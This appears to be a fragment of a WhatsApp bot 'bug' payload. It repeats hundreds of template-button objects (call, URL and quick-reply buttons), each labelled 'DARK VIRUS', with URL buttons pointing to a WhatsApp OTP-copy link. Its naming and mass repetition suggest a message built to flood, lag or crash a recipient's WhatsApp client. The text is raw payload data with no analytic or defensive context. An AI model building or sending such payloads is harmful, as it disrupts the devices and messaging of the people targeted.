{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
